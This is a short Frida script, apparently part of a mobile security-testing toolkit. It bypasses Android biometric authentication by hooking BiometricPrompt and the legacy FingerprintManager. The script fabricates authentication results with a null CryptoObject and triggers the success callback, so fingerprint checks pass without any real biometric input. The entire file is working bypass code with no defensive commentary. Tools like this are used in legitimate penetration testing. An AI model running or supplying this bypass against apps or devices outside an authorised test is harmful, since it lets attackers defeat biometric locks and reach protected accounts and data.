/*
 * Biometric prompt bypass (Praetor W8).
 * Fabricates AuthenticationResult with null CryptoObject; covers BiometricPrompt
 * + legacy FingerprintManager.
 */
Java.perform(function () {
  // androidx.biometric.BiometricPrompt
  try {
    var BP = Java.use('androidx.biometric.BiometricPrompt');
    BP.authenticate.overloads.forEach(function (ov) {
      ov.implementation = function () {
        var cb = this.mAuthenticationCallback || arguments[0];
        var ResultCls = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');
        // Fabricate null-CryptoObject result and dispatch success.
        var fake = ResultCls.$new(null, 0);
        cb.onAuthenticationSucceeded(fake);
        console.log('[+] BiometricPrompt.authenticate bypassed');
      };
    });
  } catch (e) {}

  // android.hardware.fingerprint.FingerprintManager (deprecated but still used)
  try {
    var FM = Java.use('android.hardware.fingerprint.FingerprintManager');
    FM.authenticate.overloads.forEach(function (ov) {
      ov.implementation = function () {
        var cb = arguments[2];
        var ResultCls = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
        var fake = ResultCls.$new(null, null, 0);
        cb.onAuthenticationSucceeded(fake);
        console.log('[+] FingerprintManager.authenticate bypassed');
      };
    });
  } catch (e) {}
});
